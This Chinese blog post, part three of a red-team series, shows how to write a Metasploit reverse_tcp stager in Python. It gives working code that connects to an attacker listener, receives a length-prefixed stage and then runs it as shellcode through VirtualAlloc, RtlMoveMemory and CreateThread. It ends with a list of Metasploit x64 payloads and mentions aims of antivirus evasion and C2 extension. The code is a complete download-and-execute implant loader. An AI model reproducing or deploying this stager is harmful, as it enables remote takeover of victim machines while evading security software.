---
title: msf stagers开发不完全指北(三)
date: 2020-06-28 13:43:00
tags:
- msf
- 红队
- 工具
categories:
- 开发
---

# 采用 Python 开发stagers

<!--more-->

之前的文章中我们讲到了如何使用 c 以及 golang 开发 stagers，这篇文章我将着眼于 python，探讨一下如何使用 python 实现相同的功能，也就是msf的 stagers。

## 环境

- OS: Windows 10
- Python: Python 3.7.7 (tags/v3.7.7:d7c567b08f, Mar 10 2020, 10:41:24) [MSC v.1900 64 bit (AMD64)] on win32

## 前情提要

这篇文章将是 windows reverse_tcp 相关的最后一节，让我们回忆一下之前写的文章中的流程原理，把 socket 文件描述符放入 edi 是为了传递给后面的 stages，让 stages 能够复用这个连接，所以我们有了 `mov edi, socketfd` 这一步。我们还需要取到tcp包的前四个字节，这四个字节是代表着后续 stages payload 的长度大小，获取到这个大小后，我们需要读取出指定大小的 tcp 包，然后就是把它当作 shellcode 看待，分配可读可写可执行内存，然后塞进去开始跑。

大致上流程理清楚了，我们开始用 Python 代码进行实现

## 实现细节

### 创建 tcp 连接

```python
address = ('192.168.174.136', 5555)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(address)
```

创建 tcp 连接没有什么好说的，不过这里还是需要注意的点是**把你的 payload 与 python 对应起来，比如32位payload 使用 32位 python，这点是比较重要的**

### 获取stages

```python
# 获取后续payload大小
payload_size = struct.unpack("<I", bytearray(s.recv(4)))[0]
# 设置flag接收全部数据
payload = s.recv(payload_size, socket.MSG_WAITALL)
```

这里是读取了头四个 byte 作为后续的 stages 接收长度，这里需要注意的点是 `socket.MSG_WAITALL`，这个 flag 表示从 socket 连接读取指定长度的数据包为止，不然可能造成 recv 不完全的情况，recv 默认是有长度限制的，或者自己用 for 来实现也可以。

### mov edi, socketfd

接下来就是把 socket 文件描述符放到 edi 里面去了

```python
# socket 文件描述符，为了edi调用，原理请查看 https://akkuman.cnblogs.com/p/12859091.html
socket_fd = struct.pack('<I', s.fileno())

# mov edi, socket_fd
operation = b'\xbf' + socket_fd

# 组装完整的payload
payload_with_edicall = operation + payload
```

socket 对象提供一个 fileno 方法来供我们获取到 socket 的文件描述符，获取到之后我们使用 struct 的 pack 方法给它按照小端做成一个4 byte的，构造出 `mov edi, socketfd` 对应的机器码，然后和我们之前获取到的 stages 进行拼接组装成一个完整的 payload

### 执行 stages

接下来就是像跑 shellcode 一样的活儿了

```python
shellcode = bytearray(payload_with_edicall)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

这里的 `ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64` 是必要的，至少在我这里的环境是这样，需要指定一个返回值的类型。然后我们通过 `VirtualAlloc` 申请一块可读可写可执行的内存，然后把我们的 payload 放到这块内存区域里面去，新开辟一个线程从这块内存的起始地址开始运行。



当然，其实实现执行 shellcode 的方式多种多样，这里采用你自己喜欢的一种方式即可。



## 结果截图

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/0001d74664291231760baa1db6a86dbf..png)

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/ac61f533cd546a89c922694cff428e7e..png)

可以看到能够成功上线执行命令

## 告一段落

这三篇我以 windows 的 reverse_tcp 的 payload 为例，以三个不同的语言视角进行了具体的实现，具体功效可能需要看个人自行发挥了。



接下来我会慢慢抽时间继续把这个 stagers 开发不完全指北系列继续下去，但是可能之后如果精力有限的话不会给出多个语言的实现，我会尽量把具体的原理细节说清楚，交由大家自行实现，下面开始写的话，可能会写 msf reverse_http 相关的，毕竟这个是 cs 中的主力，缺点除了需要每次心跳时才能返回数据，不够及时之外，其实还是一个很不错的东西，也会穿插着提到一些如何使用这些东西扩展 C2，使我们的免杀更具灵活性。



其实另一方面来说，面对杀软如果对网络有实时监控的话，这种直接传回 stages 的文件特征比较明显，我也会在我研读源码的过程中把一些成果丢出来，权当给大家抛砖引玉。

比如 msf 中现有的 windows x64 的 payload 有这些

```bash
msf5 exploit(multi/handler) > set payload windows/x64/
set payload windows/x64/exec                            set payload windows/x64/meterpreter_bind_named_pipe     set payload windows/x64/shell/reverse_tcp_uuid
set payload windows/x64/loadlibrary                     set payload windows/x64/meterpreter_bind_tcp            set payload windows/x64/shell_bind_tcp
set payload windows/x64/messagebox                      set payload windows/x64/meterpreter_reverse_http        set payload windows/x64/shell_reverse_tcp
set payload windows/x64/meterpreter/bind_ipv6_tcp       set payload windows/x64/meterpreter_reverse_https       set payload windows/x64/vncinject/bind_ipv6_tcp
set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid  set payload windows/x64/meterpreter_reverse_ipv6_tcp    set payload windows/x64/vncinject/bind_ipv6_tcp_uuid
set payload windows/x64/meterpreter/bind_named_pipe     set payload windows/x64/meterpreter_reverse_tcp         set payload windows/x64/vncinject/bind_named_pipe
set payload windows/x64/meterpreter/bind_tcp            set payload windows/x64/pingback_reverse_tcp            set payload windows/x64/vncinject/bind_tcp
set payload windows/x64/meterpreter/bind_tcp_rc4        set payload windows/x64/powershell_bind_tcp             set payload windows/x64/vncinject/bind_tcp_rc4
set payload windows/x64/meterpreter/bind_tcp_uuid       set payload windows/x64/powershell_reverse_tcp          set payload windows/x64/vncinject/bind_tcp_uuid
set payload windows/x64/meterpreter/reverse_http        set payload windows/x64/shell/bind_ipv6_tcp             set payload windows/x64/vncinject/reverse_http
set payload windows/x64/meterpreter/reverse_https       set payload windows/x64/shell/bind_ipv6_tcp_uuid        set payload windows/x64/vncinject/reverse_https
set payload windows/x64/meterpreter/reverse_named_pipe  set payload windows/x64/shell/bind_named_pipe           set payload windows/x64/vncinject/reverse_tcp
set payload windows/x64/meterpreter/reverse_tcp         set payload windows/x64/shell/bind_tcp                  set payload windows/x64/vncinject/reverse_tcp_rc4
set payload windows/x64/meterpreter/reverse_tcp_rc4     set payload windows/x64/shell/bind_tcp_rc4              set payload windows/x64/vncinject/reverse_tcp_uuid
set payload windows/x64/meterpreter/reverse_tcp_uuid    set payload windows/x64/shell/bind_tcp_uuid             set payload windows/x64/vncinject/reverse_winhttp
set payload windows/x64/meterpreter/reverse_winhttp     set payload windows/x64/shell/reverse_tcp               set payload windows/x64/vncinject/reverse_winhttps
set payload windows/x64/meterpreter/reverse_winhttps    set payload windows/x64/shell/reverse_tcp_rc4
```

我觉得其实是可以挑出一些自己感兴趣的进行研究